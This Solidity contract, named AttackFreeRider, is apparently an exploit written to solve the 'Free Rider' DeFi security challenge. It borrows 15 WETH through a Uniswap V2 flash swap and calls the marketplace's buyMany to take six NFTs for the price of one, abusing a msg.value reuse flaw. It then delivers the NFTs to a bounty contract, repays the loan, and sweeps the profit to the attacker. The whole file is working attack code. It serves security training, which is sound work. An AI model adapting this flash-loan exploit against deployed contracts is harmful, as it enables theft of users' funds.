// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";

interface IUniswapPair {
    function token0() external returns (address);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves()
        external
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        );
}

interface IERC20 {
    function balanceOf(address account) external returns (uint256);

    function deposit() external payable;

    function withdraw(uint amount) external;

    function transfer(address dst, uint wad) external;
}

contract AttackFreeRider {
    FreeRiderNFTMarketplace private freeRiderMarketplace;
    IUniswapPair private uniswap;
    IERC20 private weth;
    address private player;
    address private nft;
    address private devContract;
    uint256 private constant NFT_COST = 15 ether;

    constructor(
        address _marketplace,
        address _uniswap,
        address _weth,
        address _nft,
        address _dev
    ) {
        freeRiderMarketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        uniswap = IUniswapPair(_uniswap);
        weth = IERC20(_weth);
        nft = _nft;
        devContract = _dev;
        player = msg.sender;
    }

    function attack() external {
        address token0 = uniswap.token0();
        if (token0 == address(weth)) {
            uniswap.swap(NFT_COST, 0, address(this), "0x");
        } else {
            uniswap.swap(0, NFT_COST, address(this), "0x");
        }
    }

    function uniswapV2Call(address, uint256, uint256, bytes memory) external {
        weth.withdraw(NFT_COST);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        freeRiderMarketplace.buyMany{value: NFT_COST}(tokenIds);

        for (uint i = 0; i < 6; i++) {
            (bool s, ) = nft.call(
                abi.encodeWithSignature(
                    "safeTransferFrom(address,address,uint256,bytes)",
                    address(this),
                    devContract,
                    i,
                    abi.encode(address(this))
                )
            );
            require(s, "Here");
        }

        weth.deposit{value: NFT_COST + 46 * 10 ** 15}();
        weth.transfer(address(uniswap), weth.balanceOf(address(this)));

        (bool s, ) = player.call{value: address(this).balance}("");
        require(s);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }

    receive() external payable {}
}
